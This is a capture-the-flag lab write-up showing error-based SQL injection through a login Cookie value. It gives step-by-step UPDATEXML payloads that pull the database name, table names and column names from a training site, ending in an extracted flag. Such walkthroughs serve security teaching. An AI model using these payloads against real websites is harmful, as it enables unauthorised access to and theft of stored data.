# Lab 6.5.3 SQL Header Injection

## 0x00 Basic Knowledge

Websites always collecting some user data from http request header as part of the function. 

Some common php global variavles from header including

```php
$_SERVER['HTTP_HOST']       // host name
$_SERVER['HTTP_USER_AGENT'] // user browser, OS
$_SERVER['HTTP_ADDR']       // user ip
```

### Injection Query

```sql
UPDATEXML(1,CONCAT(0x7e,(SELECT DATABASE())),1)
```

[UpdateXML(xml_target, xpath_expr, new_xml)][3]

This function replaces a single portion of a given fragment of XML markup xml_target with a new XML fragment new_xml, and then returns the changed XML. The portion of xml_target that is replaced matches an XPath expression xpath_expr supplied by the user.

## 0x01 Go Hack It

Lab site from [zkaq.org][1]

### Home Page

![](./imgs/0_home.jpg)

### Injection Point

Same as last lab, login with Username and Password **zkz**.

![](./imgs/1_login.jpg)

It shows up some operations on Cookie. So we can try something with them.

Try change Cookie values. The page still shows same contents. Seems the Cookie is still effective. 

```sql
uname=zkz'#
```

### DATABASE

```sql
uname=zkz' AND UPDATEXML(1,CONCAT(0x7e,(SELECT DATABASE())),1)#
```

![](./imgs/database.jpg)

DATABASE() = zkaq

### TABLE_NAME

```sql
uname=zkz' AND UPDATEXML(1,CONCAT(0x7e,(SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() LIMIT 4,1)),1)#
```

![](./imgs/table_name.jpg)

| OFFSET | TABLE_NAME   |
| ------ | ------------ |
| 0      | emails       |
| 1      | referers     |
| 2      | uagents      |
| 3      | users        |
| 4      | zkaq         |

### COLUMN_NAME

```sql
uname=zkz' AND UPDATEXML(1,CONCAT(0x7e,(SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='zkaq' LIMIT 1,1)),1)#
```

![](./imgs/column_name.jpg)

| OFFSET | COLUMN_NAME  |
| ------ | ------------ |
| 0      | flag         |
| 1      | zKaQ         |

### FLAG

```sql
uname=zkz' AND UPDATEXML(1,CONCAT(0x7e,(SELECT zKaQ FROM zkaq WHERE flag=15)),1)#
```

![](./imgs/flag.jpg)

**FLAG** = **zKaQ-HtTpCo0kie**

[1]: https://hack.zkaq.org/?a=battle&f=target&id=67bb3cff1b012f83
[3]: https://dev.mysql.com/doc/refman/8.0/en/xml-functions.html#function_updatexml
